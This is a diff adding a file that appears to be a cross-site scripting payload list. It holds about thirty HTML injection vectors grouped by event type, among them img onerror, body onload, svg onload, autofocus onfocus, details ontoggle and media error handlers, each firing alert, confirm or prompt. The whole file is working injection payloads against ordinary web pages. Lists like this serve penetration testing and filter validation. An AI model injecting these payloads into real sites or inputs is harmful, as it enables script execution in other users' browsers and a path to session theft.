@@ -1,0 +1,52 @@
+<!-- Image events -->
+<img src=x onerror=alert(1)>
+<img src=1 onerror=alert(document.domain)>
+<img src=x onerror="javascript:alert(1)">
+<img src=x onerror=confirm(1)>
+<img src=x onerror=prompt(1)>
+
+<!-- Body / page load -->
+<body onload=alert(1)>
+<body onpageshow=alert(1)>
+
+<!-- Input / focus events -->
+<input autofocus onfocus=alert(1)>
+<input onblur=alert(1) autofocus>
+<textarea autofocus onfocus=alert(1)>
+
+<!-- Mouse events -->
+<div onmouseover=alert(1)>hover</div>
+<div onmouseenter=alert(1)>hover</div>
+<div onmouseleave=alert(1)>hover</div>
+
+<!-- Click events -->
+<button onclick=alert(1)>click</button>
+<a href=# onclick=alert(1)>click</a>
+
+<!-- Keyboard events -->
+<input onkeydown=alert(1)>
+<input onkeypress=alert(1)>
+<input onkeyup=alert(1)>
+
+<!-- Form events -->
+<form onsubmit=alert(1)>
+<input type=submit onclick=alert(1)>
+
+<!-- Media events -->
+<video src=x onerror=alert(1)></video>
+<audio src=x onerror=alert(1)></audio>
+
+<!-- SVG events -->
+<svg onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x></svg>
+
+<!-- iframe events -->
+<iframe onload=alert(1)></iframe>
+
+<!-- details/summary -->
+<details open ontoggle=alert(1)>
+
+<!-- select change -->
+<select onchange=alert(1)>
+<option>1</option>
+</select>
